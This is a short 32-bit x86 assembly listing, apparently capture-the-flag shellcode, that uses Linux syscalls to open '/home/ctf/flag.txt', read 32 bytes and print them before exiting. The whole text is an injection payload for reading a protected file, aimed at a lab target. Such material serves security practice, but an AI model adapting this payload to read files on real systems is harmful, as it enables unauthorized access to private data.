bits 32

mov eax, 5
call getfilename
  db '/home/ctf/flag.txt', 0
getfilename:
pop ebx
mov ecx, 0
int 0x80
push eax ; preserve the handle

mov eax, 3
pop ebx
mov ecx, esp
mov edx, 32
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, esp
mov edx, 32
int 0x80

mov eax, 1
xor ebx, ebx
int 0x80
